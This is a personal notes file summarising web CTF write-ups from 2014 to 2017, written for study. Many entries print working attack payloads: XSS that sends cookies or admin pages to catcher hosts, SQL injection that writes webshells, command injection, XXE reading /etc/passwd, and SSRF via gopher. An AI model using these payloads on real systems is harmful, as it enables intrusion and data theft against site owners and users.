# CTF Notes

These are my notes on past CTF write-ups, with a focus on `web`, `crypto` and realistic challenges.

- [Web](#web-)
- [Mobile](#mobile-)
- [Crypto](#crypto-)
- [Forensics](#forensics-)
- [Stegano](#stegano-)
- [Exploit](#exploit-)
- [Reverse](#reverse-)
- [Misc](#misc-)

I quickly stopped looking at `steg`, `for`, `RE` and `pwn` due to lack of interest, motivation or time to practice.
See [todo](#todo-) for full CTF tracking info.

Write-up repos used over time:
- 2013-2017 https://github.com/ctfs/
- 2018-2021 https://ctftime.org/

## web <!-- {{{ -->
<!-- 2014 {{{ -->
<details><summary>2014</summary><p>

### web400 - confidence-ctf-teaser-2014
    use self-reference in serialized php to bypass $auth['hmac_t'] === $auth['hmac']
    with $auth['hmac_t'] = &$auth['hmac']; and bypass $row['password'] == $auth['password']
    with $auth['password'] = true because var_dump("unknown pw" == true) => bool(true)

### hashes - csaw-ctf-2014
    dom xss, window.location.hash unsafely passed in jquery's $() leads to arbitrary code being eval'ed
    https://github.com/ctfs/write-ups-2014/tree/master/csaw-ctf-2014/hashes

### pigeon - defcamp-ctf-2014
    php shell via sqli INTO OUTFILE
    soffice.bin listens on 127.0.0.1:2002 use unoconv to leak /flag.txt
    https://github.com/ctfs/write-ups-2014/tree/master/d-ctf-2014/web-400

### web400 - defkthon-ctf-2014
    couchdb info leak: Error: Object Not Found - missing (GET /astro_users/test []) (errcode=404)
    list of all available documents via _all_docs or __changes endpoints
    https://github.com/ctfs/write-ups-2014/tree/master/defkthon-ctf/web-400

### hotcows dating - hacklu-ctf-2014
    csp forbids inline scripts but we can inject html via dom clobbering
    https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/hotcows-dating

### imageupload - hacklu-ctf-2014
    upload jpg with sqli in exif tag
    https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/imageupload

### daltons corporate security safe for business - hacklu-ctf-2014
    bypass captcha with javascript
    https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/daltons-corporate-security-safe-for-business

### angrybird - hackyou-ctf-2014
    Windows winapi FindFirstFile to enum directory/file names
    with files `?page=p<<` becomes `p*` and `include_once` returns the first file starting with "p" (e.g. phpinfo.php)
    with folders `0<<` returns an empty page instead of `Page does not exist` if there is a directory that starts with `0`, repeat to recover the rest
    http://www.pwntester.com/blog/2014/01/15/hackyou2014-web300-write-up/

### PHPwing - hackyou-2014
    php instantiates any arbitrary class name we provide
    list all system classes with `var_dump (get_declared_classes ())'`
    use `?action=SplFileObject&param=php://filter/read=convert.base64-encode/resource=config.php` to leak source
    xxe via `SimpleXMLElement` to ssrf to localhost/admin.php
    http://www.pwntester.com/blog/2014/01/17/hackyou2014-web400-write-up/

### snake - hackyou-2014
    perl rce, use ``X-Forwarded-For:|`echo bHMgLw==|base64 -d`|`` to bypass restrictions
    http://www.pwntester.com/blog/2014/01/15/hackyou2014-web200-write-up/

### voting - hackyou-2014
    bypass PHP `is_numeric()` with hex literal (old php)
    http://www.pwntester.com/blog/2014/01/15/hackyou2014-web100-write-up/

### easyinf - hitcon-ctf-2014
    stacked sqli, use procedure to avoid dots inside query
    `id=');set @a=0x53454c45435420...0a;PREPARE st FROM @a;EXECUTE st;SELECT ('`
    https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/easyinj

### leenode - hitcon-ctf-2014
    vulnerable jrun server behind apache, use double encoding and `\` to bypass apache
    read `/admin/.htaccess` with `/.%5cadmin%5c.htaccess%253b.jsp`
    https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/leenode

### py4h4sher - hitcon-ctf-2014
    pbkdf2 hmac sha1 collision
    https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/py4h4sher

### pushin cat - hitcon-ctf-2014
    sqli in insert and postgres+H2
    use sqli to insert a second record with admin role and IP 127.0.0.1
    use stack sql to upload webshell with H2 function `CALL CSVWRITE('/var/www/html/ws.php', 'SELECT CHR(60)||...')-- -`
    https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/pushin-cat

### xnginx - olympic-ctf-2014
    host header injection + nginx's `X-Accel-redirect` header to request /flag only accessible from localhost
    http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/

### rpc - olympic-ctf-2014
    php rpc_json_call, use magic methods `__construct` and `__wakeup` to upload webshell
    http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/

### php_jl - phd-ctf-quals-2014
    turn lfi into rce with race condition on file upload
    index.php calls `eval($_GET['code'])`
    read source with `?code=require($_GET["foo"]);&foo=php://filter/convert.base64-encode/resource=index.php`
    upload race with `?code=include($_FILES[foo][tmp_name]."|0");include($_POST[p]);include($_POST[p]);...x12 times...;include($_POST[p]);a:%0Agoto%20a;' -F foo=@test.php -F p=AAAA.. (806 As)`
    leak tmp_name by triggering a file not found include, fill up output buffer, infinite loop request is killed after 30s timeout
    then exec uploaded php with `?code=;require("/tmp/phplUaO5I");%20return%2042;`
    bypass function blacklist with test.php `<?php $file_path="ls -la /home/phd/"; $get_password_hash = 'system'; ?>`
    http://blogs.tunelko.com/2014/01/27/phdays-2014-quals-php_jl-writeup/

### oracle - phd-ctf-quals-2014
    sqli in oracle, use procedure owned by another user because current user unpriviliged
    https://github.com/ctfs/write-ups-2014/tree/master/phdays-iv-quals/oracle

### bronies - plaid-ctf-2014
    xss+xhr to access internal website (without jquery)
    use xss in website1 to redirect victim to our page with a csrf that POSTs to website2   and triggers an error to reflect another xss
    use xhr to add a form that will exfil internal website3 pages
    https://fail0verflow.com/blog/2014/plaidctf2014-web800-bronies.html

### web300 - volga-ctf-quals-2014
    php eval, confirm with `/?e=echo pi` or `/?e=phpinfo`
    most special chars blacklisted ``' " ` $ ( ) ...`` but
    ```php
    $str = <<<EOF
    string content
    EOF;
    ```
    is equivalent to `$str = "string content"`
    ```php
    include DIRECTORY_SEPARATOR.<<<EOF
    etc
    EOF
    .DIRECTORY_SEPARATOR.<<<EOF
    hosts
    EOF
    .printf
    ```
    is equivalent to `include "/etc/hosts".printf()`
    find flag in index.php with `php://filter/convert.base64-encode/resource=index.php`
    ```php
    <?
    $f= $_GET['e'];
    $f = str_replace(array('`','$','*','#',':','\\','"','(',')','>','\'','/','^',';'),'', $f);
    die(@eval("$f();"));
    FLAG?: w00t
    ```
    http://dvteam.org/writeups/volgactf/quals/2014/web/300/

### web400 - volga-ctf-quals-2014
    java server faces (JSF index.xhtml) rce via expression language injection, rfi via `?header=http://attacker/pwn.xtml` with `pwn.xtml`:
    ```xml
    <f:view xmlns:f="http://java.sun.com/jsf/core" xmlns:h="http://java.sun.com/jsf/html">
    <h:inputText id=" userName" value='${7*7}'/>
    </f:view>
    ```
    http://blog.orange.tw/2014/03/volgactf-2014-web-400-write-up.html

### web500 - volga-ctf-quals-2014
    sqlite login bypass with `/login?login=user_name&password=user_pass`
    because `WHERE user_name = "user_name" AND user_pass = "user_pass"` is true [rtfm](https://sqlite.org/lang_keywords.html)
    https://rdot.org/forum/showthread.php?p=35191#post35191

### abitbol - nuitduhack-ctf-quals-2014
    xss via contact form
    ```
    <iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg>
    <script>document.location="http://ctf.pwntest.com/catcher.php?data="+document.cookie</script>" /> # steal session id
    <iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg>
    <script>flag = new XMLHttpRequest(); flag.open('GET','/flag.php',false); flag.send();
    flag.open('GET','http://ctf.pwntester.com/catcher.php?data='+flag.response); flag.send();</script>" />
    ```

### titanoreine - nuitduhack-ctf-quals-2014
    use Virtualabs Nasty Bulletproof Jpeg generator to insert php code within valid jpg image
    lfi with prefix confirmed with `?lang=fr.php` -> `blah.php/../2.jpg`  `blah/../../includes/2.jpg` -> same image
    list directory with `?lang=/../../includes/98.jpg&c=var_dump(glob(%22*%22))%3b`
    read file with `echo%20file_get_contents(%22flag%22)%3b` or with `highlight_file()`

### nightly auth - nuitduhack-ctf-quals-2014
    time-based user enumeration then XPATH injection with password `" or 1=1 or "`
    https://github.com/ctfs/write-ups-2014/tree/master/nuit-du-hack-ctf-qualifications/nightly-auth

### whatscat - plaid-ctf-2014
    sqli in update stmt because of dns ANY request to domain provided by attacker
    https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns

### polygonshifter - plaid-ctf-2014
    blind sqli in login, `username=admin&password=' or 1=1--` -> logged in as admin
    but password is the flag so use `username=admin&password=' or (password LIKE 'a%) and 1='1`

### dt_vcs - phd-ctf-quals-2014
    xss using callback to contact (Reverse Clickjacking)
    `callback=document.body.firstChild.click&contact=javascript:alert(1)`
    http://paul-axe.blogspot.com.au/2014/01/phdays-2014-quals-dtvcs-writeup.html

### steve's list - pico-ctf-2014
    hash length extension attack, php unserialization and preg_replace /e
    https://ehsandev.com/pico2014/web_exploitation/steves_list.html

### reeekeeeeee - plaid-ctf-2014
    django website using pickle to serialize cookie
    https://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.html

### irrsa - ructf-2014-quals
    xss in user-agent but session cookie is httponly, CSP `default-src 'self'` and no outbound
    we can fix the session cookie of the admin on a different path
    https://github.com/dscheg/ructf-2014-quals-web400-writeup/

### mssngrrr - ructf-2014-quals
    xss via upload gif/js polyglot
    https://github.com/ctfs/write-ups-2014/tree/master/ructf-2014-quals/web-300

### seccon-ctf-2014
    sqlite sqli in insert via heartbleed
    https://github.com/ctfs/write-ups-2014/tree/master/seccon-ctf-2014/bleeding-heartbleed-test-web

<!-- }}} -->
<!-- 2015 {{{ -->
</p></details><details><summary>2015</summary><p>

### kummerkasten - 32c3-ctf-2015
    xss and jquery to retrieve admin pages
    `$.post('http://x:1234', {'a': btoa($('body')[0].innerHTML)})`
    https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/kummerkasten-300

### sequence hunt - 32c3-ctf-2015
    timing attack because node's `sleep()` blocks further requests
    https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/sequence-hunt-200

### tinyhosting - 32c3-ctf-2015
    php short tags, we can upload .php files but content restricted to 7 chars
    upload filenames bash and bash2 (bash2 contains `cat /*`) and upload zzz.php
    with ``<?=`*`;`` then access /zzz.php to exec `bash bash2 index.html ...`
    https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/tiny_hosting_web_250#eng-version

### webchat - bctf-2015
    sqli + xss, sqli in INSERT and use char() to bypass blacklisted chars [<>...]
    https://github.com/ctfs/write-ups-2015/tree/master/bctf-2015/web/webchat

### torrent_lover - bctf-2015
    shell command injection, use IFS to not have spaces and use tr to replace whitespace
    post_param=http%3A%2F%2Fmy.ip%2F`IFS=+;a=ls+-l;ta1=tr+'\t'+'?';ta2=tr+'\n'+'?';ta3=tr+'\40'+'?';$a|$ta1|$ta2|$ta3`.php%0aa.torrent
    https://github.com/pwning/public-writeup/blob/master/bctf2015/web_233-torrent_lover/writeup.md

### owltube - codegate-2015
    aes cbc bit flip to change `{"u": "x", "pw": "admin"}` to `{"u":  "x", "u": "admin"}`
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/CODEGATE/web/owltube/README.md

### teachers pinboard - hacklu-ctf-2015
    pickle.js nodejs
    https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/web/teachers-pinboard

### babyfirst - hitcon-ctf-quals-2015
    bypass `preg_match('/^\w+$/', args[i])` and inject in exec() with
    `?args[]=aa%0a&args[]=busybox&args[]=ftpget&args[]=<ip-in-decimal>&args[]=myscript`
    https://github.com/pwning/public-writeup/blob/master/hitcon2015/web100-babyfirst/writeup.md

### giraffe's coffee - hitcon-ctf-quals-2015
    the reset pw page uses insecure mt_rand() because when called for the first time
    PHP will generate a 32-bit seed and pass it to mt_srand() (if mt_srand has not already been called)
    with mod_php the mt_rand state is preserved for all requests in a particular worker process so
    we reset our account's pw and bruteforce the seed with http://www.openwall.com/php_mt_seed/ and
    use Keep-Alive to continue making requests to the same worker

### lalala - hitcon-ctf-quals-2015
    ssrf to our server, then redirect again with `Location: file://index.php` to bypass file:// and .php filters and leak source
    then ssrf to PHP-FPM on 127.0.0.1:9001 to craft fastcgi packet and gain rce
    https://github.com/ctfs/write-ups-2015/tree/master/hitcon-ctf-quals-2015/web/lalala

### barista - icectf-2015
    webapp written in coffeescript where maps contain builtin keys by default
    we can get the app to call an unexpected function: `/__defineGetter__?args=is_admin`
    http://blog.atx.name/icectf/#Barista

### login as admin - mma-ctf-2015
    memcache injection in cookie
    ```
    curl .. --cookie "ss=%0d%0astats"
    curl .. --cookie "ss=%0d%0aset adminkey 0 3600 20%0d%0a{\"username\":\"admin\"}"
    ```
    https://gist.github.com/Becojo/d84ff959281aea7e4ad4

### web5 - nullcon-hackim-2015
    break captcha, convert image into black & white and use tesseract-ocr (some writeups did more complicated)
    https://github.com/ctfs/write-ups-2015/tree/master/nullcon-hackim-2015/web-5

### hype - uiuctf-2015
    website lists hyperboria peers, install cjdns and access website via its hyperboria ipv6 address
    http://capturetheswag.blogspot.com.au/2015/04/uiuctf-2015-hype-web-challenge.html

<!-- }}} -->
<!-- 2016 {{{ -->
</p></details><details><summary>2016</summary><p>

### clue - backdoor-ctf-2016
    private github repo can be accessed through gh-pages `user.github.io/repo-name/flag`
    http://b0tchsec.com/2016/backdoorctf/clue

### can you hit me - ssctf-2016
    angularjs sandbox bypass -> xss
    https://github.com/ctfs/write-ups-2016/tree/master/ssctf-2016/web/can-you-hit-me-200

### legend - ssctf-2016
    nosql blind sqli
    https://github.com/ctfs/write-ups-2016/tree/master/ssctf-2016/web/legend-legend-300

### greenbox - insomnihack-teaser-2016
    javascript sandbox escape

### signserver - nullcon-hackim-2016
    xmldecoder (object serialized in xml)
    https://github.com/tuvshuud/1up/blob/master/hackim2016/web100.md
    https://www.dailysecurity.fr/write-up-hackim-web100-web400/
    http://developers-club.com/posts/271431/ zeronights hackquest ctf task "bazaarng"

### unickle - nullcon-hackim-2016
    union sqli + pickle
    https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/unickle-200

### smashthestate - nullcon-hackim-2016
    upload archive symbolic link (zip --symlinks)
    https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/smashthestate-400

### hqlol - nullcon-hackim-2016
    hql injection
    https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/unickle-200

### oldpersian - su-ctf-2016
    break captcha
    http://gnoobz.com/sharif-ctf-2016-web-250-oldpersian.html solving via image compare 100% success and super simple

### bugbounty - boston-key-party-2016
    bypass csp with
    ```html
    <link rel="prefetch" href="http://me/">
    <meta http-equiv="refresh" content="0; url=http://me/i">
    ```
    https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/web/bug-bounty-3

### rand - 0ctf-2016
    recover php rand() seed within 1 minute, given the first number and the md5 of the five next numbers
    php seeds rand() with `(((long) (time(0) * getpid())) ^ ((long) (1000000.0 * php_combined_lcg(TSRMLS_C))))`
    we can use the Date: header and just bruteforce the pid (standard pid_max is 32768)
    php reuses seeds in existing mod_php processes so established 20 connections to ensure we get numbers from a fresh Apache child
    trying all possible pids took a lot longer than one minute, but once found the first valid pid we can predict what range the next pid will be and greatly reduce the number of tries required
    https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rand_2 http://dragonsector.pl/docs/0ctf2016_writeups.pdf

### monkey - 0ctf-2016
    proof of work in Go, DNS rebinding to bypass CORS
    https://w00tsec.blogspot.com.au/2016/03/0ctf-2016-write-up-monkey-web-4.html

### guestbook - 0ctf-2016
    part1: xss and chrome xss auditor bypass trick
    use innerHTML to execute JavaScript
    bypass filter() with hexadecimal/unicode escape sequences
    pass `username=debug` to define the JS variable debug to true because our username will be reflected as `<div id="debug">` and in Chrome, HTML element with ID will be automatically available in JS
    and pass `secret=<script>var+debug=false;</script>` so that Chrome xss auditor will think that debug=false is controlled by attacker and will ignore initialization
    xss admin to send us content of phpinfo page which will contain httponly cookie
    http://security.szurek.pl/0ctf-2016-guestbook-1-writeup.html
    part2: ssrf to redis to upload files
    trick to bypass disable_function: upload .so and .php with https://blog.ka0labs.net/post/33/

### zerodaystore - bctf-2016
    b64decode doesn't "safe decode" (ignores any non-base64 stuff after the base64 string)
    bypass signature check by submitting `price=1337&sign=YTFiMmMzZDRlNWY2Cg==&price=0` to override price to 0 because `b64decode(b64encode("test")+"&price=0")` -> 'test'
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BCTF/misc/zerodaystore

### qaq - bctf-2016
    xss and CORS, use jquery to exfil responses from internal server, comment payload: `<iframe src="http://my.ip/"/>` and index.html:
    ```html
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script type="text/javascript" charset="utf-8">
    jQuery.get( "http://172.17.0.2/", function(data) {
      jQuery.post("http://my.ip/catcher", { x: data});
    });
    </script>
    ```

### homework - bctf-2016
    sqli through xss
    https://www.ibrahim-elsayed.com/?p=214

### js is not a jail - codegate-ctf-2016
    javascript jail
    https://github.com/ctfs/write-ups-2016/tree/master/codegate-ctf-2016/web/js-is-no-a-jail

### bathing and grooming - pwn2win-ctf-2016
    sqli in sqlite, implement MD5 in pure SQL
    https://github.com/epicleet/write-ups-2016/tree/pwn2win-ctf-2016/pwn2win-ctf-2016/web/bathing-and-grooming-400

### facebug - pwn2win-ctf-2016
    server-side template injection in User-Agent (Mako Templates for Python)
    http://security.szurek.pl/pwn2win-ctf-2016-facebug-writeup.html

### toil33t - nuitduhack-quals-2016
    aes ecb shuffle blocks to get admin=true
    https://www.asafety.fr/cryptologie/ctf-ndh-2016-quals-write-up-cryptography-toil33t/

### spacesec - nuitduhack-quals-2016
    mysql sqli in limit (can't do a union after order by)
    replace spaces with %0a to bypass waf
    https://www.dailysecurity.fr/write-up-ndh-quals-2016-spacesec/

### facesec2 - nuitduhack-quals-2016
    upload a tar archive with x.py file, short window to `GET /upload/x.py` and exec our code
    https://github.com/hexpresso/WU-2016/tree/master/nuit-du-hack-ctf-quals-2016/webapp/facesec2

### pixelshop - plaid-ctf-2016
    LFI via `zip://uploads/blah.png#webshell`, transform uploaded png to a zip file by changing its palette (stored in consecutive bytes)
    https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/web_pixelshop

### flag storage server - google-ctf-2016
    GQL injection using like
    `data={'username': "manager' AND password >= 'CTF{" + password + chr(c) + "' AND password < 'z"}` // for c in range(33, 126)
    http://buer.haus/2016/05/01/google-ctf-web-11-flag-storage-service/

### zippy - confidence-dragonsector-finals-ctf-2016
    use abstract.zip from [gynvael coldwind ten thousand traps](http://gynvael.coldwind.pl/?id=523) to upload zip with a .php file not visible by zip tools
    http://security.szurek.pl/confidence-dragonsector-ctf-zippy-web-300-writeup.html

### pentest - asis-ctf-2016
    ssrf in Referer to get the server's real IP from the cdn
    bf redis password and dump ssh key in the webmaster's home
    task inspired from http://antirez.com/news/96
    https://gist.github.com/stypr/30b0a68b69dbf54d20e420e2b415f8ca

### three magic - asis-ctf-2016
    command injection with restricted chars, use `{grep,-nrw,.}` to leak src
    recover seed of php mt_rand() within 3 minutes with http://www.openwall.com/php_mt_seed/
    https://thegoonies.rocks/asis-ctf-three-magic-web/

### binarycloud - asis-ctf-2016
    php7 opcache and using http://vulnsite.com///upload.php?blacklistedword to bypass parse_url() (returns false)
    https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/web/binary-cloud-153

### mfw - csaw-ctf-2016
    command injection in php assert()
    `assert("strpos('$file', '..') === false") or die();`
    exploit with `?file=') || var_dump(file_get_contents('flag.php'));//`

### angry seam - hitcon-ctf-quals-2016
    there were 3 solutions
    - java deserialization in Richfaces 3.3.3Final (CVE-2013-2165)
    - actionMethod + double EL injection (bypass 0day)
    - session puzzling (register admin username fails but upgrades to admin session)

### baby trick - hitcon-ctf-quals-2016
    bypass __wakeup() and use mysql utf-8 collation to bypass php check `"if ($username === 'orange')"` with 'orÄnge'
    https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#babytrick

### secureposts - hitcon-ctf-quals-2016
    ssti via `{{config}}` and then yaml rce in flask session cookie

### cyber-security-challenge-belgium-2016-qualifiers
    enter websocket code in browser console to submit fake score
    https://github.com/ctfs/write-ups-2016/tree/master/cyber-security-challenge-belgium-2016-qualifiers/Web%20Security/Tap-dat-ass-part1

### tsurai - mma-ctf-2016
    upload __init__.py with `x = __import__('subprocess'); x.check_output(...)`
    https://blog.0daylabs.com/2016/09/05/code-execution-python-import-mmactf-300/

### sbbs - secuinside-ctf-quals-2016
    xss + flask ssti via error page only accessible from localhost
    https://github.com/p4-team/ctf/blob/master/2016-07-09-secuinside-ctf/SBBS/README.md

### cbpm - sharif-ctf-2016
    send xss to admin to exfil flag from localStorage by updating profile (no outbound)
    https://github.com/p4-team/ctf/tree/master/2016-12-16-sharifctf7/web_300_cbpm

### lucky charms - tu-ctf-2016
    simple java deserialization
    https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/web/LuckyCharms

### ultimate design tool - whitehat-contest-11
    css injection
    https://github.com/ctfs/write-ups-2016/tree/master/whitehat-contest-11/web/ultimate-design-tool-100

### web400 - sect-ctf-2016
    bypass csp by loading outdated angularjs from whitelisted cdn
    https://blog.0daylabs.com/2016/09/09/bypassing-csp/

<!-- }}} -->
<!-- 2017 {{{ -->
</p></details><details><summary>2017</summary><p>

### artisinal shoutboxes - boston-key-party-2017
    chain 2 xss, first xss sets cookie with second xss payload to exfil admin page content
    http://www.rogdham.net/2017/02/27/boston-key-party-2017-write-ups.en

### zumbo3 - bsides-sanfransisco-ctf-2017
    ssti flask jinja2
    https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo3

### flasking unicorns - ictf-2017
    ssti to write python code to /tmp and run it via `config.from_pyfile()`
    https://0day.work/ictf-2017-flasking-unicorns-writeup-or-how-we-might-have-rooted-your-ictf-vm/

### complicated xss - 0ctf-2017
    stripped XMLHttpRequest from window but can restore it from frames[0], chain 2 xss via cookie
    https://jiulongw.github.io/post/0ctf-2017-complicated-xss/

### corp news - volga-ctf-quals-2017
    jquery xhr xss to change admin's pw
    http://fadec0d3.blogspot.com.au/2017/03/volgactf-2017-quals-corp-news-300.html

### the great continuation - insomnihack-ctf-2017
    csrf + chain 2 xss, bypass csp via uploading file containing html
    https://blog.compass-security.com/2017/03/write-up-the-great-continuation/

### smarttomcat2 - insomnihack-ctf-2017
    char @ blacklisted, bypass using gopher `u=gopher://localhost:8080/aGET%20/manager/html%20HTTP/1.1%250d%250aAuthorization:%20Basic...`
    https://blog.compass-security.com/2017/03/write-up-smarttomcat2/

### deep experiments - insomnihack-ctf-2017
    upload SHA.pm and .htaccess to break Perl publish.cgi server
    https://codisec.com/insomnihack-2017-deep-experiments/

### maze - tamuctf-2017
    websocket, use console tab of developer tools to interact with ws socket: type socket.`emit('bla', {a: 1, b: 2});`
    https://ctftime.org/writeup/6575

### paint - bctf-2017
    PHP-GD imagecreatefrompng()
    server concats 3 files, let file2 be the flag file, file1 and file3 are valid GIF prefix/suffix so that the resulting image is valid
    http://corb3nik.github.io/blog/bctf-2017/paint

### br0kenmysql[123] - meepwn-ctf-2017
    id must 2 (guest) in the first query and 1 (admin) in the second query
    - `?id=(select case substring(uuid(),5,1) when 1 then 2 else 1 end)`
    - `?id=1%2BCURRENT_TIMESTAMP%252` will bypass `sleep|benchmark|floor|rand|count|select|from|\(|\)`
    - `?id=case when @wurst is null then @wurst:=2 else @wurst:=@wurst-1 end` will bypass `sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day`

### flag shop - meepwn-ctf-2017
    sqli and bypass filter: whitespace with `/*!50000*/`, = with LIKE and AND with &&
    https://nightst0rm.net/2017/07/writeup-flag-shop-br0kenmysql-v3-meepwnctf/

### lonelyboy - meepwn-ctf-2017
    xss via svg with XMLHttpRequest() because PhantomJS needs async
    apache server uses PHP-FPM so upload .user.ini with auto_append_file xx
    upload 2.jpg with php webshell and upload xx with `<?=copy("2.jpg",2);` and rce with `GET /index.php`
    then reupload xx with auto_append_file 2 and rce with `/index.php?c=cat+...`
    https://nightst0rm.net/2017/07/writeup-lonelyboy-meepwnctf/

### rfile - rctf-2017
    lfi on flask app, in python3.5 server files are cached under `__pycache__/` so retrieve ..`/__pycache__/conf.cpython-35.pyc` to find flag
    https://ctftime.org/writeup/6714

### rcdn - rctf-2017
    exploit Chrome's unicode size expansion during browser URL normalization to submit a subdomain of length <= 6 chars
    https://ctftime.org/writeup/6715

### a template jest - sctf-2017
    nodejs (Express) command injection with `/vuln/new%20Date()`
    dump mem with `Buffer(1e5)` to find flag
    https://losfuzzys.github.io/writeup/2017/05/31/SCTF2017-temple-jest/

### back to the past - google-ctf-2017
    AngularJS v1.5.8 sandbox escape via `history.back(-1)`
    https://ctftime.org/writeup/6815

### a7 gee cue elle - google-ctf-2017
    GQL injection with rate limits
    https://github.com/p4-team/ctf/tree/master/2017-06-17-googlectf/a7_gee_cue_elle

### geokittiesv2 - google-ctf-2017
    xss with unicode U+212A kelvin sign to bypass filter
    https://drive.google.com/drive/folders/0BwMPuUHZOj0nS1MwTVF1ZW9SdEE

### mygf - secuinside-ctf-quals-2017
    use information_schema.processlist in sqli to leak secret key in first query (race)
    https://ctftime.org/writeup/6901

### polishop - poli-ctf-2017
    xpath blind injection
    https://ctftime.org/writeup/6954

### mr future president - ctfzone-2017
    email header injection + xxe
    `subject=-->%26xxe;test123%0d%0aCc:+a@evil.com&encoding=UTF-8"%3f><!DOCTYPE+foo+[<!ELEMENT+foo+ANY+><!ENTITY+xxe+SYSTEM+"file%3a///etc/passwd"+>]><!--`
    https://github.com/chamli/Write_Up_Ctf/blob/master/CTFZone%202017/Mr.Future%20President%20Blog.md

### blog - hitb-ctf-singapore-2017
    GraphQL injection / SQLite
    https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/

### h4ck3rm1nd - h4ckit-ctf-2017
    chars < and > filtered out, use bbcode `[color="test;} * {background: url('http://attacker.net/test')"]a[/color]` to inject css
    https://rioru.github.io/ctf/web/2017/08/27/ctf-writeup-hackit-2017-web200.html

### b3tters0ci4ln3twork - h4ckit-ctf-2017
    wget < 1.18 vuln to extension check via race condition CVE-2016-7098
    https://ctftime.org/task/4520

### clock - mma-ctf-2017
    use `history.pushState()` to set off xss via the Referer: header
    use WebRTC to detect local IP to bypass local IP restriction
    https://blog.tyage.net/?p=1043

### super secure storage - mma-ctf-2017
    server doesn't check JSON parameter is a string so we can pass an array to guess length and value of the encryption key
    http://corb3nik.github.io/blog/tokyo-westerns-2017/super-secure-storage

### funtimejs 2 - csaw-ctf-2017
    web server runs user code in javascript vm, use fs module to read flag file
    `console.log(require('fs').readFileSync('flag.txt').toString());`

### not my cup of coffee - csaw-ctf-2017
    send serialized Java Bean object with a parent set to the Flag bean
    https://blog.ankursundara.com/csaw-ctf-quals-2017-not-my-cup-of-coffee/

### shia labeouf off - csaw-ctf-2017
    django custom template filter tags and ssti
    https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/

### silkroad - ekoparty-ctf-2017
    HTTPoxy + proxy.py mitm
    https://jbzteam.github.io/web/EkoPartyCTF2017-silkroad

### my first app - ekoparty-ctf-2017
    /getflag -> 403 but /index.php same as /index.php/ suggests mod_rewrite regex rules, bypass with /index.php/getflag
    https://github.com/p4-team/ctf/tree/master/2017-09-17-ekoparty/my_first_app_web

### dark market - sect-ctf-2017
    graphql
    https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket

### httpbin - defcamp-2017
    create a hostname with 2 A records (1.2.3.4 and 127.0.0.1) to bypass check that input hostname doesnt resolve to localhost
    send redis commands to upload webshell
    https://dciets.com/writeups/2017/10/04/dctf-secure-httpbin/

### dctf llc - defcamp-2017
    xss + bypass CSP with `script-src 'self'` by uploading a GIF file with:
    `GIF89a='MUMBOJUMBOBOGUSBACON';var r=new XMLHttpRequest();r.open("GET","admin.php",false);r.send();document.location="http://./?r="+btoa(r.responseText);`
    https://steemit.com/ctf/@maniffin/defcamp-ctf-quals-2017-llc-webchall-writeup

### dnssosecure - hacklu-ctf-2017
    configure a BIND server with DNSSEC to return a signed A record
    https://github.com/packdesys/ctf-writeups/tree/master/hacklu-2017/dnssosecure

### criminals - pwn2win-ctf-2017
    HQL + pgsql, use `query_to_xml('<arbitrary sql>')` to execute subquery
    `array_upper(xpath('row',query_to_xml('select cast(pg_ls_dir(CHR(46))as int)',true,false,'')),1)` returns pg_xlog in error msg
    `array_upper(xpath('row',query_to_xml('select cast(pg_ls_dir((SELECT column_name||CHR(44)||table_name FROM information_schema.columns c limit 1 offset 0)) as int)',true, false,'')),1)`
    https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/

### blackbox pentesting - pwn2win-ctf-2017
    xss to make admin post second xss to parent domain to retrieve cookie with flag (admin runs first xss from sandbox.bloodsuckers.world, but cookie is in bloodsuckers.world)
    use multiple username input fields to bypass 12-char server-side limit
    https://github.com/RapaceDiabolique/ctf_writeup/blob/master/Pwn2Win%20CTF%202017/BlackBox%20Pentesting.md

### sqlsrf - seccon-ctf-2017
    wget bug, use newlines to append smtp commands through the Host: header and cross protocol talk to smtp server
    https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/web_sqlsrf

### extract0r - 34c3-ctf-2017
    upload zip containing a symlink using .blah to bypass filter and browse server's filesystem
    ssrf + parse_url bypass using `http://foo@localhost:foo@google.com:3306/` or `http://foo@[cafebabe.cf]@google.com:3306/`
    use `gopher://` to retrieve flag from mysql db
